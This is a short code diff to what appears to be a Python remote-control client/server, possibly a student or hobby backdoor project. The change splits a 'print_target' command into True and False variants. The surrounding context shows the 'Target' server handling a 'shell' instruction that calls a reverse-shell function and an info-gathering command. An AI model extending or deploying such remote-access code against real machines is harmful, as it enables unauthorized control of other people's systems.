@@ -54,8 +54,11 @@ class Client(Machine):
         print(info.decode("utf-8"))
         input("\n\nPress ENTER")
 
-    def print_target(self):
-        self.s.send(str.encode("print_target"))
+    def print_target(self, print_bool):
+        if print_bool:
+            self.s.send(str.encode("print_target_True"))
+        else:
+            self.s.send(str.encode("print_target_False"))
 
 
 # Target is the server
@@ -97,8 +100,10 @@ class Target(Machine):
                     print("Leave the programme... Bye")
                 self.quit()
                 break
-            elif instruction == "print_target":
+            elif instruction == "print_target_True":
                 self.print = True
+            elif instruction == "print_target_False":
+                self.print = False
             elif instruction == "shell":
                 self.reverse_shell_target()
             elif instruction == "getinfo_generality":
